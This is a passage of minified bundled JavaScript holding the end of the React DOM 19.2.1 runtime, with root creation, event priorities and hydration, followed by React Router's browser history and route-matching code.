            u === a && l.set(null, n),
            l.set(c, n),
            this.count++,
            a = ci.bind(this),
            n.addEventListener("load", a),
            n.addEventListener("error", a),
            u ? u.parentNode.insertBefore(n, u.nextSibling) : (e = e.nodeType === 9 ? e.head : e,
            e.insertBefore(n, e.firstChild)),
            t.state.loading |= 4
        }
    }
    var Zn = {
        $$typeof: V,
        Provider: null,
        Consumer: null,
        _currentValue: $,
        _currentValue2: $,
        _threadCount: 0
    };
    function Qp(e, t, l, a, n, u, c, r, h) {
        this.tag = 1,
        this.containerInfo = e,
        this.pingCache = this.current = this.pendingChildren = null,
        this.timeoutHandle = -1,
        this.callbackNode = this.next = this.pendingContext = this.context = this.cancelPendingCommit = null,
        this.callbackPriority = 0,
        this.expirationTimes = Ei(-1),
        this.entangledLanes = this.shellSuspendCounter = this.errorRecoveryDisabledLanes = this.expiredLanes = this.warmLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
        this.entanglements = Ei(0),
        this.hiddenUpdates = Ei(null),
        this.identifierPrefix = a,
        this.onUncaughtError = n,
        this.onCaughtError = u,
        this.onRecoverableError = c,
        this.pooledCache = null,
        this.pooledCacheLanes = 0,
        this.formState = h,
        this.incompleteTransitions = new Map
    }
    function Yd(e, t, l, a, n, u, c, r, h, T, M, U) {
        return e = new Qp(e,t,l,c,h,T,M,U,r),
        t = 1,
        u === !0 && (t |= 24),
        u = Nt(3, null, null, t),
        e.current = u,
        u.stateNode = e,
        t = sc(),
        t.refCount++,
        e.pooledCache = t,
        t.refCount++,
        u.memoizedState = {
            element: a,
            isDehydrated: l,
            cache: t
        },
        dc(u),
        e
    }
    function wd(e) {
        return e ? (e = Da,
        e) : Da
    }
    function Gd(e, t, l, a, n, u) {
        n = wd(n),
        a.context === null ? a.context = n : a.pendingContext = n,
        a = Tl(t),
        a.payload = {
            element: l
        },
        u = u === void 0 ? null : u,
        u !== null && (a.callback = u),
        l = Al(e, a, t),
        l !== null && (yt(l, e, t),
        Nn(l, e, t))
    }
    function Xd(e, t) {
        if (e = e.memoizedState,
        e !== null && e.dehydrated !== null) {
            var l = e.retryLane;
            e.retryLane = l !== 0 && l < t ? l : t
        }
    }
    function Os(e, t) {
        Xd(e, t),
        (e = e.alternate) && Xd(e, t)
    }
    function Qd(e) {
        if (e.tag === 13 || e.tag === 31) {
            var t = Wl(e, 67108864);
            t !== null && yt(t, e, 67108864),
            Os(e, 67108864)
        }
    }
    function Zd(e) {
        if (e.tag === 13 || e.tag === 31) {
            var t = zt();
            t = Ti(t);
            var l = Wl(e, t);
            l !== null && yt(l, e, t),
            Os(e, t)
        }
    }
    var ri = !0;
    function Zp(e, t, l, a) {
        var n = O.T;
        O.T = null;
        var u = B.p;
        try {
            B.p = 2,
            Ms(e, t, l, a)
        } finally {
            B.p = u,
            O.T = n
        }
    }
    function Vp(e, t, l, a) {
        var n = O.T;
        O.T = null;
        var u = B.p;
        try {
            B.p = 8,
            Ms(e, t, l, a)
        } finally {
            B.p = u,
            O.T = n
        }
    }
    function Ms(e, t, l, a) {
        if (ri) {
            var n = Rs(a);
            if (n === null)
                ys(e, t, a, fi, l),
                Kd(e, a);
            else if (Jp(n, e, t, l, a))
                a.stopPropagation();
            else if (Kd(e, a),
            t & 4 && -1 < Kp.indexOf(e)) {
                for (; n !== null; ) {
                    var u = ya(n);
                    if (u !== null)
                        switch (u.tag) {
                        case 3:
                            if (u = u.stateNode,
                            u.current.memoizedState.isDehydrated) {
                                var c = Vl(u.pendingLanes);
                                if (c !== 0) {
                                    var r = u;
                                    for (r.pendingLanes |= 2,
                                    r.entangledLanes |= 2; c; ) {
                                        var h = 1 << 31 - bt(c);
                                        r.entanglements[1] |= h,
                                        c &= ~h
                                    }
                                    Jt(u),
                                    (Te & 6) === 0 && (Ju = Ye() + 500,
                                    qn(0))
                                }
                            }
                            break;
                        case 31:
                        case 13:
                            r = Wl(u, 2),
                            r !== null && yt(r, u, 2),
                            $u(),
                            Os(u, 2)
                        }
                    if (u = Rs(a),
                    u === null && ys(e, t, a, fi, l),
                    u === n)
                        break;
                    n = u
                }
                n !== null && a.stopPropagation()
            } else
                ys(e, t, a, null, l)
        }
    }
    function Rs(e) {
        return e = Ui(e),
        _s(e)
    }
    var fi = null;
    function _s(e) {
        if (fi = null,
        e = va(e),
        e !== null) {
            var t = v(e);
            if (t === null)
                e = null;
            else {
                var l = t.tag;
                if (l === 13) {
                    if (e = x(t),
                    e !== null)
                        return e;
                    e = null
                } else if (l === 31) {
                    if (e = z(t),
                    e !== null)
                        return e;
                    e = null
                } else if (l === 3) {
                    if (t.stateNode.current.memoizedState.isDehydrated)
                        return t.tag === 3 ? t.stateNode.containerInfo : null;
                    e = null
                } else
                    t !== e && (e = null)
            }
        }
        return fi = e,
        null
    }
    function Vd(e) {
        switch (e) {
        case "beforetoggle":
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "toggle":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 2;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 8;
        case "message":
            switch (Qt()) {
            case ji:
                return 2;
            case ma:
                return 8;
            case ha:
            case Rm:
                return 32;
            case Ps:
                return 268435456;
            default:
                return 32
            }
        default:
            return 32
        }
    }
    var Us = !1
      , Bl = null
      , ql = null
      , Yl = null
      , Vn = new Map
      , Kn = new Map
      , wl = []
      , Kp = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
    function Kd(e, t) {
        switch (e) {
        case "focusin":
        case "focusout":
            Bl = null;
            break;
        case "dragenter":
        case "dragleave":
            ql = null;
            break;
        case "mouseover":
        case "mouseout":
            Yl = null;
            break;
        case "pointerover":
        case "pointerout":
            Vn.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            Kn.delete(t.pointerId)
        }
    }
    function Jn(e, t, l, a, n, u) {
        return e === null || e.nativeEvent !== u ? (e = {
            blockedOn: t,
            domEventName: l,
            eventSystemFlags: a,
            nativeEvent: u,
            targetContainers: [n]
        },
        t !== null && (t = ya(t),
        t !== null && Qd(t)),
        e) : (e.eventSystemFlags |= a,
        t = e.targetContainers,
        n !== null && t.indexOf(n) === -1 && t.push(n),
        e)
    }
    function Jp(e, t, l, a, n) {
        switch (t) {
        case "focusin":
            return Bl = Jn(Bl, e, t, l, a, n),
            !0;
        case "dragenter":
            return ql = Jn(ql, e, t, l, a, n),
            !0;
        case "mouseover":
            return Yl = Jn(Yl, e, t, l, a, n),
            !0;
        case "pointerover":
            var u = n.pointerId;
            return Vn.set(u, Jn(Vn.get(u) || null, e, t, l, a, n)),
            !0;
        case "gotpointercapture":
            return u = n.pointerId,
            Kn.set(u, Jn(Kn.get(u) || null, e, t, l, a, n)),
            !0
        }
        return !1
    }
    function Jd(e) {
        var t = va(e.target);
        if (t !== null) {
            var l = v(t);
            if (l !== null) {
                if (t = l.tag,
                t === 13) {
                    if (t = x(l),
                    t !== null) {
                        e.blockedOn = t,
                        uo(e.priority, function() {
                            Zd(l)
                        });
                        return
                    }
                } else if (t === 31) {
                    if (t = z(l),
                    t !== null) {
                        e.blockedOn = t,
                        uo(e.priority, function() {
                            Zd(l)
                        });
                        return
                    }
                } else if (t === 3 && l.stateNode.current.memoizedState.isDehydrated) {
                    e.blockedOn = l.tag === 3 ? l.stateNode.containerInfo : null;
                    return
                }
            }
        }
        e.blockedOn = null
    }
    function di(e) {
        if (e.blockedOn !== null)
            return !1;
        for (var t = e.targetContainers; 0 < t.length; ) {
            var l = Rs(e.nativeEvent);
            if (l === null) {
                l = e.nativeEvent;
                var a = new l.constructor(l.type,l);
                _i = a,
                l.target.dispatchEvent(a),
                _i = null
            } else
                return t = ya(l),
                t !== null && Qd(t),
                e.blockedOn = l,
                !1;
            t.shift()
        }
        return !0
    }
    function kd(e, t, l) {
        di(e) && l.delete(t)
    }
    function kp() {
        Us = !1,
        Bl !== null && di(Bl) && (Bl = null),
        ql !== null && di(ql) && (ql = null),
        Yl !== null && di(Yl) && (Yl = null),
        Vn.forEach(kd),
        Kn.forEach(kd)
    }
    function mi(e, t) {
        e.blockedOn === t && (e.blockedOn = null,
        Us || (Us = !0,
        s.unstable_scheduleCallback(s.unstable_NormalPriority, kp)))
    }
    var hi = null;
    function $d(e) {
        hi !== e && (hi = e,
        s.unstable_scheduleCallback(s.unstable_NormalPriority, function() {
            hi === e && (hi = null);
            for (var t = 0; t < e.length; t += 3) {
                var l = e[t]
                  , a = e[t + 1]
                  , n = e[t + 2];
                if (typeof a != "function") {
                    if (_s(a || l) === null)
                        continue;
                    break
                }
                var u = ya(l);
                u !== null && (e.splice(t, 3),
                t -= 3,
                Rc(u, {
                    pending: !0,
                    data: n,
                    method: l.method,
                    action: a
                }, a, n))
            }
        }))
    }
    function Ia(e) {
        function t(h) {
            return mi(h, e)
        }
        Bl !== null && mi(Bl, e),
        ql !== null && mi(ql, e),
        Yl !== null && mi(Yl, e),
        Vn.forEach(t),
        Kn.forEach(t);
        for (var l = 0; l < wl.length; l++) {
            var a = wl[l];
            a.blockedOn === e && (a.blockedOn = null)
        }
        for (; 0 < wl.length && (l = wl[0],
        l.blockedOn === null); )
            Jd(l),
            l.blockedOn === null && wl.shift();
        if (l = (e.ownerDocument || e).$$reactFormReplay,
        l != null)
            for (a = 0; a < l.length; a += 3) {
                var n = l[a]
                  , u = l[a + 1]
                  , c = n[ft] || null;
                if (typeof u == "function")
                    c || $d(l);
                else if (c) {
                    var r = null;
                    if (u && u.hasAttribute("formAction")) {
                        if (n = u,
                        c = u[ft] || null)
                            r = c.formAction;
                        else if (_s(n) !== null)
                            continue
                    } else
                        r = c.action;
                    typeof r == "function" ? l[a + 1] = r : (l.splice(a, 3),
                    a -= 3),
                    $d(l)
                }
            }
    }
    function Wd() {
        function e(u) {
            u.canIntercept && u.info === "react-transition" && u.intercept({
                handler: function() {
                    return new Promise(function(c) {
                        return n = c
                    }
                    )
                },
                focusReset: "manual",
                scroll: "manual"
            })
        }
        function t() {
            n !== null && (n(),
            n = null),
            a || setTimeout(l, 20)
        }
        function l() {
            if (!a && !navigation.transition) {
                var u = navigation.currentEntry;
                u && u.url != null && navigation.navigate(u.url, {
                    state: u.getState(),
                    info: "react-transition",
                    history: "replace"
                })
            }
        }
        if (typeof navigation == "object") {
            var a = !1
              , n = null;
            return navigation.addEventListener("navigate", e),
            navigation.addEventListener("navigatesuccess", t),
            navigation.addEventListener("navigateerror", t),
            setTimeout(l, 100),
            function() {
                a = !0,
                navigation.removeEventListener("navigate", e),
                navigation.removeEventListener("navigatesuccess", t),
                navigation.removeEventListener("navigateerror", t),
                n !== null && (n(),
                n = null)
            }
        }
    }
    function Hs(e) {
        this._internalRoot = e
    }
    pi.prototype.render = Hs.prototype.render = function(e) {
        var t = this._internalRoot;
        if (t === null)
            throw Error(o(409));
        var l = t.current
          , a = zt();
        Gd(l, a, e, t, null, null)
    }
    ,
    pi.prototype.unmount = Hs.prototype.unmount = function() {
        var e = this._internalRoot;
        if (e !== null) {
            this._internalRoot = null;
            var t = e.containerInfo;
            Gd(e.current, 2, null, e, null, null),
            $u(),
            t[pa] = null
        }
    }
    ;
    function pi(e) {
        this._internalRoot = e
    }
    pi.prototype.unstable_scheduleHydration = function(e) {
        if (e) {
            var t = no();
            e = {
                blockedOn: null,
                target: e,
                priority: t
            };
            for (var l = 0; l < wl.length && t !== 0 && t < wl[l].priority; l++)
                ;
            wl.splice(l, 0, e),
            l === 0 && Jd(e)
        }
    }
    ;
    var Fd = d.version;
    if (Fd !== "19.2.1")
        throw Error(o(527, Fd, "19.2.1"));
    B.findDOMNode = function(e) {
        var t = e._reactInternals;
        if (t === void 0)
            throw typeof e.render == "function" ? Error(o(188)) : (e = Object.keys(e).join(","),
            Error(o(268, e)));
        return e = m(t),
        e = e !== null ? D(e) : null,
        e = e === null ? null : e.stateNode,
        e
    }
    ;
    var $p = {
        bundleType: 0,
        version: "19.2.1",
        rendererPackageName: "react-dom",
        currentDispatcherRef: O,
        reconcilerVersion: "19.2.1"
    };
    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
        var vi = __REACT_DEVTOOLS_GLOBAL_HOOK__;
        if (!vi.isDisabled && vi.supportsFiber)
            try {
                tn = vi.inject($p),
                St = vi
            } catch {}
    }
    return $n.createRoot = function(e, t) {
        if (!p(e))
            throw Error(o(299));
        var l = !1
          , a = ""
          , n = af
          , u = nf
          , c = uf;
        return t != null && (t.unstable_strictMode === !0 && (l = !0),
        t.identifierPrefix !== void 0 && (a = t.identifierPrefix),
        t.onUncaughtError !== void 0 && (n = t.onUncaughtError),
        t.onCaughtError !== void 0 && (u = t.onCaughtError),
        t.onRecoverableError !== void 0 && (c = t.onRecoverableError)),
        t = Yd(e, 1, !1, null, null, l, a, null, n, u, c, Wd),
        e[pa] = t.current,
        vs(e),
        new Hs(t)
    }
    ,
    $n.hydrateRoot = function(e, t, l) {
        if (!p(e))
            throw Error(o(299));
        var a = !1
          , n = ""
          , u = af
          , c = nf
          , r = uf
          , h = null;
        return l != null && (l.unstable_strictMode === !0 && (a = !0),
        l.identifierPrefix !== void 0 && (n = l.identifierPrefix),
        l.onUncaughtError !== void 0 && (u = l.onUncaughtError),
        l.onCaughtError !== void 0 && (c = l.onCaughtError),
        l.onRecoverableError !== void 0 && (r = l.onRecoverableError),
        l.formState !== void 0 && (h = l.formState)),
        t = Yd(e, 1, !0, t, l ?? null, a, n, h, u, c, r, Wd),
        t.context = wd(null),
        l = t.current,
        a = zt(),
        a = Ti(a),
        n = Tl(a),
        n.callback = null,
        Al(l, n, a),
        l = a,
        t.current.lanes = l,
        an(t, l),
        Jt(t),
        e[pa] = t.current,
        vs(e),
        new pi(t)
    }
    ,
    $n.version = "19.2.1",
    $n
}
var cm;
function uv() {
    if (cm)
        return qs.exports;
    cm = 1;
    function s() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(s)
            } catch (d) {
                console.error(d)
            }
    }
    return s(),
    qs.exports = nv(),
    qs.exports
}
var iv = uv();
var sm = "popstate";
function cv(s={}) {
    function d(o, p) {
        let {pathname: v, search: x, hash: z} = o.location;
        return Vs("", {
            pathname: v,
            search: x,
            hash: z
        }, p.state && p.state.usr || null, p.state && p.state.key || "default")
    }
    function f(o, p) {
        return typeof p == "string" ? p : Fn(p)
    }
    return ov(d, f, null, s)
}
function we(s, d) {
    if (s === !1 || s === null || typeof s > "u")
        throw new Error(d)
}
function Gt(s, d) {
    if (!s) {
        typeof console < "u" && console.warn(d);
        try {
            throw new Error(d)
        } catch {}
    }
}
function sv() {
    return Math.random().toString(36).substring(2, 10)
}
function om(s, d) {
    return {
        usr: s.state,
        key: s.key,
        idx: d
    }
}
function Vs(s, d, f=null, o) {
    return {
        pathname: typeof s == "string" ? s : s.pathname,
        search: "",
        hash: "",
        ...typeof d == "string" ? Pa(d) : d,
        state: f,
        key: d && d.key || o || sv()
    }
}
function Fn({pathname: s="/", search: d="", hash: f=""}) {
    return d && d !== "?" && (s += d.charAt(0) === "?" ? d : "?" + d),
    f && f !== "#" && (s += f.charAt(0) === "#" ? f : "#" + f),
    s
}
function Pa(s) {
    let d = {};
    if (s) {
        let f = s.indexOf("#");
        f >= 0 && (d.hash = s.substring(f),
        s = s.substring(0, f));
        let o = s.indexOf("?");
        o >= 0 && (d.search = s.substring(o),
        s = s.substring(0, o)),
        s && (d.pathname = s)
    }
    return d
}
function ov(s, d, f, o={}) {
    let {window: p=document.defaultView, v5Compat: v=!1} = o
      , x = p.history
      , z = "POP"
      , N = null
      , m = D();
    m == null && (m = 0,
    x.replaceState({
        ...x.state,
        idx: m
    }, ""));
    function D() {
        return (x.state || {
            idx: null
        }).idx
    }
    function j() {
        z = "POP";
        let G = D()
          , w = G == null ? null : G - m;
        m = G,
        N && N({
            action: z,
            location: Y.location,
            delta: w
        })
    }
    function H(G, w) {
        z = "PUSH";
        let Q = Vs(Y.location, G, w);
        m = D() + 1;
        let V = om(Q, m)
          , ae = Y.createHref(Q);
        try {
            x.pushState(V, "", ae)
        } catch (be) {
            if (be instanceof DOMException && be.name === "DataCloneError")
                throw be;
            p.location.assign(ae)
        }
        v && N && N({
            action: z,
            location: Y.location,
            delta: 1
        })
    }
    function q(G, w) {
        z = "REPLACE";
        let Q = Vs(Y.location, G, w);
        m = D();
        let V = om(Q, m)
          , ae = Y.createHref(Q);
        x.replaceState(V, "", ae),
        v && N && N({
            action: z,
            location: Y.location,
            delta: 0
        })
    }
    function X(G) {
        return rv(G)
    }
    let Y = {
        get action() {
            return z
        },
        get location() {
            return s(p, x)
        },
        listen(G) {
            if (N)
                throw new Error("A history only accepts one active listener");
            return p.addEventListener(sm, j),
            N = G,
            () => {
                p.removeEventListener(sm, j),
                N = null
            }
        },
        createHref(G) {
            return d(p, G)
        },
        createURL: X,
        encodeLocation(G) {
            let w = X(G);
            return {
                pathname: w.pathname,
                search: w.search,
                hash: w.hash
            }
        },
        push: H,
        replace: q,
        go(G) {
            return x.go(G)
        }
    };
    return Y
}
function rv(s, d=!1) {
    let f = "http://localhost";
    typeof window < "u" && (f = window.location.origin !== "null" ? window.location.origin : window.location.href),
    we(f, "No window.location.(origin|href) available to create URL");
    let o = typeof s == "string" ? s : Fn(s);
    return o = o.replace(/ $/, "%20"),
    !d && o.startsWith("//") && (o = f + o),
    new URL(o,f)
}
function hm(s, d, f="/") {
    return fv(s, d, f, !1)
}
function fv(s, d, f, o) {
    let p = typeof d == "string" ? Pa(d) : d
      , v = vl(p.pathname || "/", f);
    if (v == null)
        return null;
    let x = pm(s);
    dv(x);
    let z = null;
    for (let N = 0; z == null && N < x.length; ++N) {
        let m = jv(v);
        z = xv(x[N], m, o)
    }
    return z
}
function pm(s, d=[], f=[], o="", p=!1) {
    let v = (x, z, N=p, m) => {
        let D = {
            relativePath: m === void 0 ? x.path || "" : m,
            caseSensitive: x.caseSensitive === !0,
            childrenIndex: z,
            route: x
        };
        if (D.relativePath.startsWith("/")) {
            if (!D.relativePath.startsWith(o) && N)
                return;
            we(D.relativePath.startsWith(o), `Absolute route path "${D.relativePath}" nested under path "${o}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),
            D.relativePath = D.relativePath.slice(o.length)
        }
        let j = pl([o, D.relativePath])
          , H = f.concat(D);
        x.children && x.children.length > 0 && (we(x.index !== !0, `Index routes must not have child routes. Please remove all child routes from route path "${j}".`),
        pm(x.children, d, H, j, N)),
        !(x.path == null && !x.index) && d.push({
            path: j,
            score: Sv(j, x.index),
            routesMeta: H
        })
    }
    ;
    return s.forEach( (x, z) => {
        if (x.path === "" || !x.path?.includes("?"))
            v(x, z);
        else
            for (let N of vm(x.path))
                v(x, z, !0, N)
    }
    ),
    d
}
function vm(s) {
    let d = s.split("/");
    if (d.length === 0)
        return [];
    let[f,...o] = d
      , p = f.endsWith("?")
      , v = f.replace(/\?$/, "");
    if (o.length === 0)
        return p ? [v, ""] : [v];
    let x = vm(o.join("/"))
      , z = [];
    return z.push(...x.map(N => N === "" ? v : [v, N].join("/"))),
    p && z.push(...x),
    z.map(N => s.startsWith("/") && N === "" ? "/" : N)
}
function dv(s) {
    s.sort( (d, f) => d.score !== f.score ? f.score - d.score : bv(d.routesMeta.map(o => o.childrenIndex), f.routesMeta.map(o => o.childrenIndex)))
}
var mv = /^:[\w-]+$/
  , hv = 3
  , pv = 2
  , vv = 1
  , yv = 10
  , gv = -2
  , rm = s => s === "*";
function Sv(s, d) {
    let f = s.split("/")
      , o = f.length;
    return f.some(rm) && (o += gv),
    d && (o += pv),
    f.filter(p => !rm(p)).reduce( (p, v) => p + (mv.test(v) ? hv : v === "" ? vv : yv), o)
}
function bv(s, d) {
    return s.length === d.length && s.slice(0, -1).every( (o, p) => o === d[p]) ? s[s.length - 1] - d[d.length - 1] : 0
}
function xv(s, d, f=!1) {
    let {routesMeta: o} = s
      , p = {}
      , v = "/"
      , x = [];
    for (let z = 0; z < o.length; ++z) {
        let N = o[z]
          , m = z === o.length - 1
          , D = v === "/" ? d : d.slice(v.length) || "/"
          , j = bi({
            path: N.relativePath,
            caseSensitive: N.caseSensitive,
            end: m
        }, D)
          , H = N.route;
        if (!j && m && f && !o[o.length - 1].route.index && (j = bi({
            path: N.relativePath,
            caseSensitive: N.caseSensitive,
            end: !1
        }, D)),
        !j)
            return null;
        Object.assign(p, j.params),
        x.push({
            params: p,
            pathname: pl([v, j.pathname]),
            pathnameBase: Dv(pl([v, j.pathnameBase])),
            route: H
        }),
        j.pathnameBase !== "/" && (v = pl([v, j.pathnameBase]))
    }
    return x
}
function bi(s, d) {
    typeof s == "string" && (s = {
        path: s,
        caseSensitive: !1,
        end: !0
    });
    let[f,o] = Nv(s.path, s.caseSensitive, s.end)
      , p = d.match(f);
    if (!p)
        return null;
    let v = p[0]
      , x = v.replace(/(.)\/+$/, "$1")
      , z = p.slice(1);
    return {
        params: o.reduce( (m, {paramName: D, isOptional: j}, H) => {
            if (D === "*") {
                let X = z[H] || "";
                x = v.slice(0, v.length - X.length).replace(/(.)\/+$/, "$1")
            }
            const q = z[H];
            return j && !q ? m[D] = void 0 : m[D] = (q || "").replace(/%2F/g, "/"),
            m
        }
        , {}),
        pathname: v,
        pathnameBase: x,
        pattern: s
    }
}
function Nv(s, d=!1, f=!0) {
    Gt(s === "*" || !s.endsWith("*") || s.endsWith("/*"), `Route path "${s}" will be treated as if it were "${s.replace(/\*$/, "/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${s.replace(/\*$/, "/*")}".`);
    let o = []
      , p = "^" + s.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (x, z, N) => (o.push({
        paramName: z,
        isOptional: N != null
    }),
    N ? "/?([^\\/]+)?" : "/([^\\/]+)")).replace(/\/([\w-]+)\?(\/|$)/g, "(/$1)?$2");
    return s.endsWith("*") ? (o.push({
        paramName: "*"
    }),
    p += s === "*" || s === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : f ? p += "\\/*$" : s !== "" && s !== "/" && (p += "(?:(?=\\/|$))"),
    [new RegExp(p,d ? void 0 : "i"), o]
}
function jv(s) {
    try {
        return s.split("/").map(d => decodeURIComponent(d).replace(/\//g, "%2F")).join("/")
    } catch (d) {
        return Gt(!1, `The URL path "${s}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${d}).`),
        s
    }
}
function vl(s, d) {
    if (d === "/")
        return s;
    if (!s.toLowerCase().startsWith(d.toLowerCase()))
        return null;
    let f = d.endsWith("/") ? d.length - 1 : d.length
      , o = s.charAt(f);
    return o && o !== "/" ? null : s.slice(f) || "/"
}
var Ev = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , Tv = s => Ev.test(s);
function Av(s, d="/") {
    let {pathname: f, search: o="", hash: p=""} = typeof s == "string" ? Pa(s) : s, v;
    if (f)
        if (Tv(f))
            v = f;
        else {
            if (f.includes("//")) {
                let x = f;
                f = f.replace(/\/\/+/g, "/"),
                Gt(!1, `Pathnames cannot have embedded double slashes - normalizing ${x} -> ${f}`)
            }
            f.startsWith("/") ? v = fm(f.substring(1), "/") : v = fm(f, d)
        }
    else
        v = d;
    return {
        pathname: v,
        search: Cv(o),
        hash: Ov(p)
    }
}
function fm(s, d) {
    let f = d.replace(/\/+$/, "").split("/");
    return s.split("/").forEach(p => {
        p === ".." ? f.length > 1 && f.pop() : p !== "." && f.push(p)
    }
    ),
    f.length > 1 ? f.join("/") : "/"
}
function Xs(s, d, f, o) {
    return `Cannot include a '${s}' character in a manually specified \`to.${d}\` field [${JSON.stringify(o)}].  Please separate it out to the \`to.${f}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`
}
function zv(s) {
    return s.filter( (d, f) => f === 0 || d.route.path && d.route.path.length > 0)
}
function ym(s) {
    let d = zv(s);
    return d.map( (f, o) => o === d.length - 1 ? f.pathname : f.pathnameBase)
}
function gm(s, d, f, o=!1) {
    let p;
    typeof s == "string" ? p = Pa(s) : (p = {
        ...s
    },
    we(!p.pathname || !p.pathname.includes("?"), Xs("?", "pathname", "search", p)),
    we(!p.pathname || !p.pathname.includes("#"), Xs("#", "pathname", "hash", p)),
    we(!p.search || !p.search.includes("#"), Xs("#", "search", "hash", p)));
    let v = s === "" || p.pathname === "", x = v ? "/" : p.pathname, z;
    if (x == null)
        z = f;
    else {
        let j = d.length - 1;
        if (!o && x.startsWith("..")) {
            let H = x.split("/");
            for (; H[0] === ".."; )
                H.shift(),
                j -= 1;
            p.pathname = H.join("/")
        }
        z = j >= 0 ? d[j] : "/"
    }
    let N = Av(p, z)
      , m = x && x !== "/" && x.endsWith("/")
      , D = (v || x === ".") && f.endsWith("/");
    return !N.pathname.endsWith("/") && (m || D) && (N.pathname += "/"),
    N
}
var pl = s => s.join("/").replace(/\/\/+/g, "/")
  , Dv = s => s.replace(/\/+$/, "").replace(/^\/*/, "/")
  , Cv = s => !s || s === "?" ? "" : s.startsWith("?") ? s : "?" + s
  , Ov = s => !s || s === "#" ? "" : s.startsWith("#") ? s : "#" + s;
function Mv(s) {
    return s != null && typeof s.status == "number" && typeof s.statusText == "string" && typeof s.internal == "boolean" && "data" in s
}
function Rv(s) {
    return s.map(d => d.route.path).filter(Boolean).join("/").replace(/\/\/*/g, "/") || "/"
}
Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
var Sm = ["POST", "PUT", "PATCH", "DELETE"];
new Set(Sm);
var _v = ["GET", ...Sm];
new Set(_v);
var en = S.createContext(null);
en.displayName = "DataRouter";
var xi = S.createContext(null);
xi.displayName = "DataRouterState";
S.createContext(!1);
var bm = S.createContext({
    isTransitioning: !1
});
bm.displayName = "ViewTransition";
var Uv = S.createContext(new Map);
Uv.displayName = "Fetchers";
var Hv = S.createContext(null);
Hv.displayName = "Await";
var Xt = S.createContext(null);
Xt.displayName = "Navigation";
var In = S.createContext(null);
In.displayName = "Location";
var $t = S.createContext({
    outlet: null,
    matches: [],
    isDataRoute: !1
});
$t.displayName = "Route";
var ks = S.createContext(null);
ks.displayName = "RouteError";
function Lv(s, {relative: d}={}) {
    we(Pn(), "useHref() may be used only in the context of a <Router> component.");
    let {basename: f, navigator: o} = S.useContext(Xt)
      , {hash: p, pathname: v, search: x} = eu(s, {
        relative: d
    })
      , z = v;
    return f !== "/" && (z = v === "/" ? f : pl([f, v])),
    o.createHref({
        pathname: z,
        search: x,
        hash: p
    })
}
function Pn() {
    return S.useContext(In) != null
}
function oa() {
    return we(Pn(), "useLocation() may be used only in the context of a <Router> component."),
    S.useContext(In).location
}
var xm = "You should call navigate() in a React.useEffect(), not when your component is first rendered.";
function Nm(s) {
    S.useContext(Xt).static || S.useLayoutEffect(s)
}
function Xl() {
    let {isDataRoute: s} = S.useContext($t);
    return s ? Wv() : Bv()
}
function Bv() {
    we(Pn(), "useNavigate() may be used only in the context of a <Router> component.");
    let s = S.useContext(en)
      , {basename: d, navigator: f} = S.useContext(Xt)
      , {matches: o} = S.useContext($t)
      , {pathname: p} = oa()
      , v = JSON.stringify(ym(o))
      , x = S.useRef(!1);
    return Nm( () => {
        x.current = !0
    }
    ),
    S.useCallback( (N, m={}) => {
        if (Gt(x.current, xm),
        !x.current)
            return;
        if (typeof N == "number") {
            f.go(N);
            return
        }
        let D = gm(N, JSON.parse(v), p, m.relative === "path");
        s == null && d !== "/" && (D.pathname = D.pathname === "/" ? d : pl([d, D.pathname])),
        (m.replace ? f.replace : f.push)(D, m.state, m)
    }
    , [d, f, v, p, s])
}
S.createContext(null);
function qv() {
    let {matches: s} = S.useContext($t)
      , d = s[s.length - 1];
    return d ? d.params : {}
}
function eu(s, {relative: d}={}) {
    let {matches: f} = S.useContext($t)
      , {pathname: o} = oa()
      , p = JSON.stringify(ym(f));
    return S.useMemo( () => gm(s, JSON.parse(p), o, d === "path"), [s, p, o, d])
}
function Yv(s, d) {
    return jm(s, d)
}
function jm(s, d, f, o, p) {
    we(Pn(), "useRoutes() may be used only in the context of a <Router> component.");
    let {navigator: v} = S.useContext(Xt)
      , {matches: x} = S.useContext($t)
      , z = x[x.length - 1]
      , N = z ? z.params : {}
      , m = z ? z.pathname : "/"
      , D = z ? z.pathnameBase : "/"
      , j = z && z.route;
    {
        let Q = j && j.path || "";
